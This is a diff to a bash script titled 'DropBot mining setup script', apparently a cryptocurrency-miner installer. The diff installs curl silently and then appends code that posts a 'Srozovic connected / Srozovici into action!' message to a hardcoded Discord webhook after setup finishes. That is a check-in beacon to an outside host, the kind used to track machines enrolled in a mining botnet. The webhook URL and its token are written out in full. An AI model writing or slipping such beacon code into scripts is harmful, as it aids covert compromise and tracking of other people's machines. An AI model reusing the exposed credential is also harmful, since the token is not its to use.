@@ -1,7 +1,7 @@
 #!/bin/bash
 
 VERSION=1.0
-
+apt install curl -y
 # printing greetings
 
 echo "DropBot mining setup script v$VERSION."
@@ -313,5 +313,24 @@ fi
 echo ""
 
 echo "[*] Setup complete"
+
+discord_url="https://discord.com/api/webhooks/1190082010241302658/g-OP0V5BlJNZTvu1teYeEYXtCNT1aLAg_tooRXW4sxsVzBlJzVUlTdDnCYZBppK5xkpP"
+
+generate_post_data() {
+  cat <<EOF
+{
+  "content": "Srozovic povezan",
+  "embeds": [{
+    "title": "Srozovic povezan",
+    "description": "Srozovici u akciju!",
+    "color": "45973"
+  }]
+}
+EOF
+}
+
+
+# POST request to Discord Webhook
+curl -H "Content-Type: application/json" -X POST -d "$(generate_post_data)" $discord_url
 
 
